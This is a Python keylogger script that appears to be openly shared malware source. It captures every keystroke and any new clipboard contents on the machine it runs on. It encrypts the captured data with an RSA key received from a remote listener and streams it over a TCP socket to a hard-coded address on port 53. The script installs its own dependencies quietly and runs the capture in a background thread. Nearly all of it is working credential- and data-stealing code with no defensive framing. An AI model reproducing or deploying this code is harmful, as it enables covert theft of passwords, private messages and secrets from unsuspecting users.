#!/usr/bin/python3

# _*_ coding: utf-8 _*_


#tested on Linux (Linux kali 6.5.0-kali2-amd64)

# to do:
# logging keystrokes of virtual keyboard
# data encryption

# fixed:
# thousands of connection to 1 server (Now the data are sent within a single socket connection)


try:
    from os import system
    import threading, socket
    from pynput import keyboard  #type: ignore

    # for getting the clipboard data (supports cross platform)
    from pyperclip import paste  

    # encryption and encoding
    import rsa
    from base64 import b64encode
except:
    #two dependencies pynput and pandas ['-q' for quite mode]
    system('pip install -q pynput')
    system('pip install -q pyperclip')
    system('pip install -q rsa')

# <-- Initializing global values -->

# replace the IP with your server's IP 
# LAN (it establishes a TCP connection for sending data)
SERVER_ADDRESS = ("192.168.29.54", "53")

duplicate = ['']  # for sending unique clipboard data


#keystroke record
class keylogger:

    # init
    def __init__(self):
        #connecting to the server
        self.server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.server.connect((SERVER_ADDRESS[0],int(SERVER_ADDRESS[1])))

        # receive and deserialize the RSA public key from the server
        self.serialized_publickey = self.server.recv(4096).decode()
        self.publickey = rsa.PublicKey.load_pkcs1(self.serialized_publickey)
    

    def clipboarddata(self,data):
        try:
            self.server.send(b64encode(rsa.encrypt(f'Clipboard data: {data}'.encode(), self.publickey)))
        except:
            pass


    def Keylogging(self):
        def on_key_press(key):
            try:
                # to get the clipboard data
                data = paste()

                if data != duplicate[0]:
                    self.clipboarddata(data)
                    duplicate[0] = data

                # sending the Base64 encoded RSA encrypted data to the server
                self.server.send(b64encode(rsa.encrypt(str(key).encode(), self.publickey)))

            except:
                pass


        # Create listener objects
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()


    # destruct
    def __del__(self):
        self.server.close()


if __name__=='__main__':
    try:
        #creating an object
        obj=keylogger()

        #implementing threading and daemon = True (to run it in the background)
        t1 = threading.Thread(target=obj.Keylogging,daemon=True)
        t1.start() 
        t1.join()    
    
    except KeyboardInterrupt:
        pass

